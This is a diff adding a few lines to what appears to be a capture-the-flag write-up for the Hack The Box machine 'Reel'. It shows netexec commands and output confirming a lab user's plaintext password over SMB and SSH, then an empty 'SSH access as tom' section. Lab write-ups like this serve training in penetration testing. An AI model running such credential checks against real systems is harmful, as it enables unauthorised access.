@@ -409,3 +409,15 @@ SMB         10.129.16.113   445    REEL             [+] HTB.LOCAL\tom:1ts-mag1c!
 ```
 This user is compromised
 
+```python
+nxc ssh reel.htb.local -u 'tom' -p '1ts-mag1c!!!'     
+SSH         10.129.16.113   22     reel.htb.local   [*] SSH-2.0-OpenSSH_7.6
+SSH         10.129.16.113   22     reel.htb.local   [+] tom:1ts-mag1c!!!  Windows - Shell access!
+```
+This user has access over SSH
+
+## SSH access as `tom`
+```python
+
+```
+
